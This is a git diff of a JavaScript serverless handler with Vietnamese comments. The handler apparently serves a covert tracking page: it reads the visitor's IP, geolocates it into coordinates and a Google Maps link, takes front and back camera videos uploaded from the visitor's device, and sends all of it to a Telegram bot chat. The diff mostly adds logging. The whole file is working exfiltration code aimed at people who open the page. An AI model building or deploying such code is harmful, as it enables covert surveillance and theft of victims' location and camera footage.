@@ -8,7 +8,6 @@ export default async function handler(req) {
     return new Response("Method Not Allowed", { status: 405 });
 
   try {
-    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ
     const userIP =
       req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
     
@@ -24,7 +23,6 @@ export default async function handler(req) {
     const lon = geo.longitude || "0";
     const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
 
-    // 2. NHẬN DỮ LIỆU
     const contentType = req.headers.get("content-type") || "";
     let clientData = {};
     let formData = null;
@@ -32,6 +30,10 @@ export default async function handler(req) {
     if (contentType.includes("multipart/form-data")) {
       formData = await req.formData();
       clientData = JSON.parse(formData.get("clientInfo") || "{}");
+      console.log('📥 FormData nhận được:');
+      console.log('- clientInfo:', clientData);
+      console.log('- hasFront:', formData.has("front"));
+      console.log('- hasBack:', formData.has("back"));
     } else {
       clientData = await req.json();
     }
@@ -39,7 +41,6 @@ export default async function handler(req) {
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
-    // 3. TẠO CAPTION
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
@@ -53,20 +54,21 @@ export default async function handler(req) {
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
 🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
-🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
-⏱️ Thời lượng: 10 giây mỗi video
+🎥 Video trước: ${hasFront ? '✅ Có' : '❌ Không'}
+🎥 Video sau: ${hasBack ? '✅ Có' : '❌ Không'}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
 `.trim();
 
-    // 4. GỬI VIDEO LÊN TELEGRAM
+    console.log('📤 Bắt đầu gửi lên Telegram...');
+
     if (hasFront || hasBack) {
       let frontResult = null;
       let backResult = null;
 
-      // Gửi video trước
       if (hasFront) {
         const frontFile = formData.get("front");
+        console.log(`📤 Gửi front.mp4, dung lượng: ${(frontFile.size / 1024).toFixed(2)} KB`);
         const frontForm = new FormData();
         frontForm.append("chat_id", CHAT_ID);
         frontForm.append("video", frontFile);
@@ -80,11 +82,12 @@ export default async function handler(req) {
             body: frontForm,
           }
         );
+        console.log('✅ Đã gửi front.mp4');
       }
 
-      // Gửi video sau
       if (hasBack) {
         const backFile = formData.get("back");
+        console.log(`📤 Gửi back.mp4, dung lượng: ${(backFile.size / 1024).toFixed(2)} KB`);
         const backForm = new FormData();
         backForm.append("chat_id", CHAT_ID);
         backForm.append("video", backFile);
@@ -100,6 +103,7 @@ export default async function handler(req) {
             body: backForm,
           }
         );
+        console.log('✅ Đã gửi back.mp4');
       }
 
       const response = {
@@ -113,7 +117,7 @@ export default async function handler(req) {
       });
       
     } else {
-      // Gửi text nếu không có video
+      console.log('📤 Không có video, gửi text...');
       const res = await fetch(
         `https://api.telegram.org/bot${TOKEN}/sendMessage`,
         {
@@ -128,6 +132,7 @@ export default async function handler(req) {
       return new Response(await res.text(), { status: 200 });
     }
   } catch (err) {
+    console.error('❌ Lỗi:', err);
     return new Response(JSON.stringify({ error: err.message }), {
       status: 500,
     });
